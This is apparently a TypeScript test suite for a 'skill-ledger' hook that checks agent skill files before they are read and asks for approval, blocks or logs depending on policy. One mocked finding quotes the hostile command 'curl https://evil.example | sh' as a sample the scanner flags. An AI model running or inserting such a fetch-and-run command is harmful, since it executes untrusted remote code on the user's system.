import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { homedir } from "node:os";
import { resolve } from "node:path";
import { skillLedger } from "../../src/capabilities/skill-ledger.js";
import { _resetCliMock, _setCliMock } from "../../src/utils.js";
import type { CliResult } from "../../src/utils.js";

type RegisteredHook = {
  hookName: string;
  handler: (event: any, ctx: any) => Promise<any>;
  priority: number;
};

function createMockApi(pluginConfig: Record<string, any> = {}) {
  const hooks: RegisteredHook[] = [];
  const logs: string[] = [];

  const api = {
    pluginConfig,
    logger: {
      info: (msg: string) => logs.push(`[INFO] ${msg}`),
      error: (msg: string) => logs.push(`[ERROR] ${msg}`),
      warn: (msg: string) => logs.push(`[WARN] ${msg}`),
      debug: (msg: string) => logs.push(`[DEBUG] ${msg}`),
    },
    on: (hookName: string, handler: any, opts?: { priority?: number }) => {
      hooks.push({ hookName, handler, priority: opts?.priority ?? 0 });
    },
  };

  return { api: api as any, hooks, logs };
}

function registerHandlers(pluginConfig: Record<string, any> = {}) {
  const { api, hooks, logs } = createMockApi(pluginConfig);
  skillLedger.register(api);
  const beforeToolCall = hooks.find((hook) => hook.hookName === "before_tool_call");
  assert.ok(beforeToolCall, "before_tool_call handler should be registered");
  return { beforeToolCall, hooks, logs };
}

function policyConfig(
  policy: "observe" | "ask" | "debug" | "warn" | "block",
): Record<string, any> {
  return {
    capabilities: {
      "skill-ledger": { policy },
    },
  };
}

function legacyEnableBlockConfig(enableBlock: boolean): Record<string, any> {
  return {
    capabilities: {
      "skill-ledger": { enableBlock },
    },
  };
}

let checkCallCount = 0;
let lastCheckArgs: string[] | undefined;
let lastInitArgs: string[] | undefined;

function agentSecCommandOffset(args: string[]): number {
  return args[0] === "--trace-context" ? 2 : 0;
}

function mockSkillLedgerCheck(result: CliResult): void {
  _setCliMock(async (args) => {
    const offset = agentSecCommandOffset(args);
    if (
      args[offset] === "skill-ledger" &&
      args[offset + 1] === "init" &&
      args[offset + 2] === "--no-baseline"
    ) {
      lastInitArgs = args;
      return {
        exitCode: 0,
        stdout: JSON.stringify({ fingerprint: "test-fingerprint" }),
        stderr: "",
      };
    }

    if (args[offset] === "skill-ledger" && args[offset + 1] === "show") {
      checkCallCount++;
      lastCheckArgs = args;
      return result;
    }

    return { exitCode: 0, stdout: "", stderr: "" };
  });
}

function mockSkillLedgerInitFailure(stderr: string): void {
  _setCliMock(async (args) => {
    const offset = agentSecCommandOffset(args);
    if (
      args[offset] === "skill-ledger" &&
      args[offset + 1] === "init" &&
      args[offset + 2] === "--no-baseline"
    ) {
      lastInitArgs = args;
      return {
        exitCode: 1,
        stdout: "",
        stderr,
      };
    }

    if (args[offset] === "skill-ledger" && args[offset + 1] === "show") {
      checkCallCount++;
      lastCheckArgs = args;
      return {
        exitCode: 0,
        stdout: JSON.stringify({ latestStatus: "pass", message: null }),
        stderr: "",
      };
    }

    return { exitCode: 0, stdout: "", stderr: "" };
  });
}

function mockSkillLedgerStatus(status: string, exitCode = 0): void {
  mockSkillLedgerCheck({
    exitCode,
    stdout: JSON.stringify({
      latestStatus: status,
      message: status === "pass" ? null : `summary message for ${status}`,
    }),
    stderr: "",
  });
}

function readSkillEvent(path = "/skills/risky/SKILL.md", runId = "run-1") {
  return {
    toolName: "read",
    params: { file_path: path },
    runId,
  };
}

describe("skill-ledger", () => {
  beforeEach(() => {
    delete process.env.SKILL_LEDGER_HOOK_ENABLED;
    delete process.env.SKILL_LEDGER_MODE;
    checkCallCount = 0;
    lastCheckArgs = undefined;
    lastInitArgs = undefined;
  });

  afterEach(() => {
    delete process.env.SKILL_LEDGER_HOOK_ENABLED;
    delete process.env.SKILL_LEDGER_MODE;
    _resetCliMock();
  });

  it("registers only before_tool_call", () => {
    mockSkillLedgerStatus("pass");
    const { hooks } = registerHandlers();

    assert.deepEqual(
      hooks.map((hook) => hook.hookName),
      ["before_tool_call"],
    );
    assert.equal(hooks[0].priority, 80);
    assert.deepEqual(skillLedger.hooks, ["before_tool_call"]);
  });

  it("does not initialize keys or register hooks when disabled", async () => {
    process.env.SKILL_LEDGER_HOOK_ENABLED = "false";
    mockSkillLedgerStatus("pass");
    const pluginConfig = new Proxy(
      {},
      {
        get() {
          throw new Error("plugin config should not be read when disabled");
        },
      },
    );
    const { api, hooks } = createMockApi(pluginConfig);

    skillLedger.register(api);
    await new Promise((resolvePromise) => setTimeout(resolvePromise, 10));

    assert.deepEqual(hooks, []);
    assert.equal(lastInitArgs, undefined);
  });

  it("does not initialize on registration or unrelated tool calls", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();
    assert.equal(lastInitArgs, undefined);
    await beforeToolCall.handler({ toolName: "read", params: { path: "/tmp/a.txt" } }, {});
    assert.equal(lastInitArgs, undefined);
    assert.equal(checkCallCount, 0);
  });

  it("reports initialization failure without checking the Skill", async () => {
    mockSkillLedgerInitFailure("private diagnostic");
    const { beforeToolCall, logs } = registerHandlers();
    assert.equal(await beforeToolCall.handler(readSkillEvent(), {}), undefined);
    assert.equal(lastCheckArgs, undefined);
    assert.ok(logs.some((log) => log.includes("init --no-baseline failed: exit 1")));
    assert.ok(logs.every((log) => !log.includes("private diagnostic")));
  });

  it("rechecks daemon readiness on the next invocation and preserves context", async () => {
    mockSkillLedgerInitFailure("failed");
    const { beforeToolCall } = registerHandlers();
    await beforeToolCall.handler(readSkillEvent(), {});
    mockSkillLedgerStatus("pass");
    await beforeToolCall.handler(
      { ...readSkillEvent(), sessionId: "session-1", toolCallId: "tool-1" }, {},
    );
    assert.equal(checkCallCount, 1);
    assert.equal(lastInitArgs?.[0], "--trace-context");
    assert.deepEqual(JSON.parse(lastInitArgs![1]), {
      agent_name: "openclaw", session_id: "session-1", run_id: "run-1", tool_call_id: "tool-1",
    });
    assert.deepEqual(lastInitArgs?.slice(2), ["skill-ledger", "init", "--no-baseline"]);
    lastInitArgs = undefined;
    await beforeToolCall.handler(readSkillEvent(), {});
    assert.ok(lastInitArgs, "readiness must not be cached across daemon restarts");
  });

  it("matches read SKILL.md calls and preserves file_path priority", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    await beforeToolCall.handler(
      {
        toolName: "read",
        params: {
          file_path: "/skills/alpha/SKILL.md",
          path: "/skills/beta/SKILL.md",
        },
      },
      {},
    );

    assert.equal(checkCallCount, 1);
    assert.ok(lastCheckArgs?.includes("/skills/alpha"));
  });

  it("expands leading ~/ before invoking skill-ledger show", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    await beforeToolCall.handler(
      readSkillEvent("~/openclaw/skills/session-logs/SKILL.md"),
      {},
    );

    const expectedSkillDir = resolve(homedir(), "openclaw/skills/session-logs");
    assert.equal(checkCallCount, 1);
    assert.ok(lastCheckArgs?.includes(expectedSkillDir));
    assert.ok(!lastCheckArgs?.some((arg) => arg.includes("/~/")));
  });

  it("keeps home prefix when ~/ is followed by repeated slashes", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    await beforeToolCall.handler(
      readSkillEvent("~//openclaw/skills/session-logs/SKILL.md"),
      {},
    );

    const expectedSkillDir = resolve(homedir(), "openclaw/skills/session-logs");
    assert.equal(checkCallCount, 1);
    assert.ok(lastCheckArgs?.includes(expectedSkillDir));
    assert.ok(!lastCheckArgs?.includes("/openclaw/skills/session-logs"));
  });

  it("passes hook trace context to skill-ledger show", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    await beforeToolCall.handler(
      {
        toolName: "read",
        params: { file_path: "/skills/traced/SKILL.md" },
        sessionId: "session-1",
        runId: "run-1",
        toolUseId: "tool-1",
        trace: { traceId: "nested-trace-is-not-hook-input" },
      },
      {},
    );

    assert.equal(lastCheckArgs?.[0], "--trace-context");
    assert.equal(
      lastCheckArgs?.[1],
      JSON.stringify({
        agent_name: "openclaw",
        session_id: "session-1",
        run_id: "run-1",
        tool_call_id: "tool-1",
      }),
    );
    assert.equal(lastCheckArgs?.[2], "skill-ledger");
  });

  it("skips non-read tools and non-SKILL.md reads", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    await beforeToolCall.handler(
      { toolName: "exec", params: { command: "cat /skills/a/SKILL.md" } },
      {},
    );
    await beforeToolCall.handler(
      { toolName: "read", params: { file_path: "/skills/a/README.md" } },
      {},
    );

    assert.equal(checkCallCount, 0);
  });

  it("fails open on CLI errors and malformed events", async () => {
    mockSkillLedgerCheck({ exitCode: 1, stdout: "", stderr: "boom" });
    const { beforeToolCall, logs } = registerHandlers();

    assert.equal(await beforeToolCall.handler(readSkillEvent(), {}), undefined);
    assert.equal(await beforeToolCall.handler(null, {}), undefined);
    assert.equal(await beforeToolCall.handler({ toolName: "read" }, {}), undefined);

    assert.ok(logs.some((log) => log.includes("[WARN] [skill-ledger]")));
  });

  it("pass allows silently", async () => {
    mockSkillLedgerStatus("pass");
    const { beforeToolCall } = registerHandlers();

    assert.equal(await beforeToolCall.handler(readSkillEvent(), { runId: "run-1" }), undefined);
  });

  it("warn with null message allows silently", async () => {
    mockSkillLedgerCheck({
      exitCode: 0,
      stdout: JSON.stringify({
        latestStatus: "warn",
        message: null,
      }),
      stderr: "",
    });
    const { beforeToolCall } = registerHandlers();

    assert.equal(await beforeToolCall.handler(readSkillEvent(), { runId: "run-1" }), undefined);
  });

  it("user decision summary with null message allows silently", async () => {
    mockSkillLedgerCheck({
      exitCode: 0,
      stdout: JSON.stringify({
        latestStatus: "deny",
        userDecision: { action: "allow" },
        message: null,
      }),
      stderr: "",
    });
    const { beforeToolCall } = registerHandlers();

    assert.equal(await beforeToolCall.handler(readSkillEvent(), { runId: "run-1" }), undefined);
  });

  for (const status of ["none", "warn", "drifted", "deny", "tampered"]) {
    it(`${status} asks for approval by default`, async () => {
      mockSkillLedgerStatus(status);
      const { beforeToolCall } = registerHandlers();

      const result = await beforeToolCall.handler(
        readSkillEvent(`/skills/${status}/SKILL.md`, "run-1"),
        { runId: "run-1" },
      );

      assert.equal(result?.requireApproval?.title, "Skill Ledger Security Check");
      assert.equal(
        result?.requireApproval?.description,
        `[skill-ledger][${status}] Skill: ${status}; summary message for ${status}\nDetails: logs.`,
      );
      assert.equal(
        result?.requireApproval?.severity,
        status === "deny" || status === "tampered" ? "critical" : "warning",
      );
    });
  }

  for (const status of ["none", "warn", "drifted", "deny", "tampered"]) {
    for (const scenario of ["long summary", "long name", "both"]) {
      it(`bounds ${status} approval with ${scenario} and preserves the full log`, async () => {
        const skillName = scenario === "long summary" ? "risky" : "risky-" + "名".repeat(300);
        const summary = "danger.sh: curl-risk; " +
          (scenario === "long name" ? "review required" : "risk detail ".repeat(50));
        mockSkillLedgerCheck({
          exitCode: 0,
          stdout: JSON.stringify({ latestStatus: status, message: summary }),
          stderr: "",
        });
        const { beforeToolCall, logs } = registerHandlers();
        const event = readSkillEvent(`/skills/${skillName}/SKILL.md`);

        const result = await beforeToolCall.handler(event, {});

        const description = result?.requireApproval?.description;
        assert.equal(typeof description, "string");
        assert.ok(description.length <= 256, `description length: ${description.length}`);
        const nameExcerpt = scenario === "long summary" ? skillName : "risky-" + "名".repeat(41) + "…";
        assert.ok(description.startsWith(`[skill-ledger][${status}] Skill: ${nameExcerpt}; `));
        assert.match(description, /danger\.sh: curl-risk/);
        assert.ok(description.endsWith("\nDetails: logs."));
        assert.equal(result.requireApproval.title, "Skill Ledger Security Check");
        assert.equal(result.requireApproval.severity,
          status === "deny" || status === "tampered" ? "critical" : "warning");
        assert.ok(logs.includes(`[WARN] [skill-ledger] ⚠️ Skill '${skillName}': ${summary}`));
        assert.deepEqual(lastCheckArgs?.slice(2), ["skill-ledger", "show", `/skills/${skillName}`]);
        assert.deepEqual(event, readSkillEvent(`/skills/${skillName}/SKILL.md`));
      });
    }
  }

  it("includes finding summary in deny approval while keeping critical severity", async () => {
    const message =
      "Latest version v000002 is deny and is not exposed; current active version is v000001. " +
      "Latest findings: [deny] danger.sh danger-shell: executes curl https://evil.example | sh. " +
      "Review hidden latest with export --version latest, then decide: block, rollback --version v000001, or allow after review.";
    mockSkillLedgerCheck({
      exitCode: 0,
      stdout: JSON.stringify({
        latestStatus: "deny",
        message,
      }),
      stderr: "",
    });
    const { beforeToolCall, logs } = registerHandlers();

    const result = await beforeToolCall.handler(
      readSkillEvent("/skills/deny/SKILL.md"),
      {},
    );

    assert.equal(result?.requireApproval?.title, "Skill Ledger Security Check");
    assert.match(result?.requireApproval?.description, /danger\.sh/);
    assert.match(result?.requireApproval?.description, /curl https:\/\/evil\.example \| sh/);
    assert.ok(result?.requireApproval?.description.length <= 256);
    assert.ok(logs.some((log) => log.includes(message)));
    assert.ok(logs.some((log) => log.includes("rollback --version v000001")));
    assert.equal(result?.requireApproval?.severity, "critical");
  });

  for (const status of ["none", "drifted", "deny", "tampered"]) {
    it(`${status} logs debug and allows with debug policy`, async () => {
      mockSkillLedgerStatus(status);
      const { beforeToolCall, logs } = registerHandlers(policyConfig("debug"));

      const result = await beforeToolCall.handler(
        readSkillEvent(`/skills/${status}/SKILL.md`, "run-1"),
        { runId: "run-1" },
      );

      assert.equal(result, undefined);
      assert.ok(logs.some((log) => log.includes("[DEBUG] [skill-ledger]")));
      assert.ok(!logs.some((log) => log.includes("[WARN] [skill-ledger]")));
    });
  }

  it("invalid explicit policy falls back to default ask policy", async () => {
    mockSkillLedgerStatus("deny");
    const { beforeToolCall, logs } = registerHandlers({
      capabilities: {
        "skill-ledger": { policy: "blcok" },
      },
    });

    const result = await beforeToolCall.handler(
      readSkillEvent("/skills/deny/SKILL.md"),
      {},
    );

    assert.ok(result?.requireApproval);
    assert.ok(
      logs.some((log) =>
        log.includes("[WARN] [skill-ledger] invalid policy=\"blcok\"; using ask"),
      ),
    );
  });

  it("lets the environment policy override capability configuration", async () => {
    process.env.SKILL_LEDGER_MODE = "observe";
    mockSkillLedgerStatus("deny");
    const { beforeToolCall, logs } = registerHandlers(policyConfig("block"));

    const result = await beforeToolCall.handler(readSkillEvent("/skills/deny/SKILL.md"), {});

    assert.equal(result, undefined);
    assert.ok(logs.some((log) => log.includes("[DEBUG] [skill-ledger]")));
  });

  it("invalid environment mode falls back to default ask policy", async () => {
    process.env.SKILL_LEDGER_MODE = "blcok";
    mockSkillLedgerStatus("deny");
    const { beforeToolCall, logs } = registerHandlers(policyConfig("observe"));

    const result = await beforeToolCall.handler(readSkillEvent("/skills/deny/SKILL.md"), {});

    assert.ok(result?.requireApproval);
    assert.ok(
      logs.some((log) =>
        log.includes("[WARN] [skill-ledger] invalid SKILL_LEDGER_MODE; using ask"),
      ),
    );
  });

  it("maps deny in the environment mode to block", async () => {
    process.env.SKILL_LEDGER_MODE = "deny";
    mockSkillLedgerStatus("deny");
    const { beforeToolCall } = registerHandlers(policyConfig("observe"));

    const result = await beforeToolCall.handler(readSkillEvent("/skills/deny/SKILL.md"), {});

    assert.equal(result?.block, true);
    assert.match(result?.blockReason, /summary message for deny/);
  });

  it("block policy hard-blocks with the summary message", async () => {
    mockSkillLedgerStatus("deny");
    const { beforeToolCall } = registerHandlers(policyConfig("block"));

    const result = await beforeToolCall.handler(
      readSkillEvent("/skills/deny/SKILL.md"),
      {},
    );

    assert.equal(result?.block, true);
    assert.match(result?.blockReason, /summary message for deny/);
  });

  for (const status of ["warn", "error", "mystery"]) {
    it(`${status} logs warning without approval with warn policy`, async () => {
      mockSkillLedgerStatus(status, status === "error" ? 1 : 0);
      const { beforeToolCall, logs } = registerHandlers(policyConfig("warn"));

      const result = await beforeToolCall.handler(
        readSkillEvent(`/skills/${status}/SKILL.md`, "run-1"),
        { runId: "run-1" },
      );

      assert.equal(result, undefined);
      assert.ok(logs.some((log) => log.includes("[WARN] [skill-ledger]")));
    });
  }

  for (const status of ["error", "mystery"]) {
    it(`${status} logs warning without approval in legacy enableBlock=false mode`, async () => {
      for (const pluginConfig of [legacyEnableBlockConfig(false)]) {
        mockSkillLedgerStatus(status, status === "error" ? 1 : 0);
        const { beforeToolCall, logs } = registerHandlers(pluginConfig);

        const result = await beforeToolCall.handler(
          readSkillEvent(`/skills/${status}/SKILL.md`, "run-1"),
          { runId: "run-1" },
        );

        assert.equal(result, undefined);
        assert.ok(logs.some((log) => log.includes("[WARN] [skill-ledger]")));
      }
    });
  }

  it("maps legacy enableBlock=true to block policy", async () => {
    mockSkillLedgerStatus("deny");
    const { beforeToolCall } = registerHandlers(legacyEnableBlockConfig(true));

    const result = await beforeToolCall.handler(readSkillEvent("/skills/deny/SKILL.md"), {});

    assert.equal(result?.block, true);
    assert.match(result?.blockReason, /summary message for deny/);
  });
  for (const [value, exitCode] of [
    [{ status: "error", error: "private failure" }, 1],
    [{ status: "error", error: "private failure" }, 0],
    [{ latestStatus: "pass", message: null }, 1],
    [{ latestStatus: "deny" }, 0],
    [{ latestStatus: "mystery", message: "private failure" }, 0],
    [{ latestStatus: "pass", message: 7 }, 0],
    [null, 0], [[], 0],
  ] as const) {
    it(`diagnoses invalid show result ${JSON.stringify(value)} / ${exitCode}`, async () => {
      mockSkillLedgerCheck({ exitCode, stdout: JSON.stringify(value), stderr: "private failure" });
      const { beforeToolCall, logs } = registerHandlers(policyConfig("block"));
      assert.equal(await beforeToolCall.handler(readSkillEvent(), {}), undefined);
      assert.ok(logs.some((log) => log.includes("[WARN] [skill-ledger]")));
      assert.ok(logs.every((log) => !log.includes("private failure")));
    });
  }

  it("retains unmanaged show results without treating them as malformed", async () => {
    mockSkillLedgerCheck({ exitCode: 0, stdout: JSON.stringify({ managed: false, latestStatus: "unmanaged", message: null }), stderr: "" });
    const { beforeToolCall, logs } = registerHandlers(policyConfig("block"));
    assert.equal(await beforeToolCall.handler(readSkillEvent(), {}), undefined);
    assert.deepEqual(logs, []);
  });

});
